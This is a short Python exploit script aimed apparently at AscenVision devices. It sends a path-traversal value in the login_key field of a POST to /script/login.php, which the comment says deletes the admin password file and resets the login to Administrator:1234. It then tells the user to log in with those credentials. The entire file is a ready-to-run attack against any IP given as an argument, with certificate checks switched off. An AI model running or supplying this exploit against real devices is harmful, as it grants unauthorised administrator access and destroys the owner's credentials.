import requests, sys
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def authBypass(host):
  try:  
    bpData = "login_key=../../../../../usr/AscenVision/etc/admin_passwd&AccountAlias=&Password=&AdminCheck=yes&Action=" # unlink() deletes pwd file, resets to Administrator:1234
    requests.post(f"https://{host}/script/login.php", data=bpData, headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10, verify=False)
    print("Done. Try to login with Administrator:1234")
  except Exception as e:
    print(e)

if len(sys.argv) != 2:
  print(f"{sys.argv[0]} ip")
  exit()
  
authBypass(sys.argv[1])
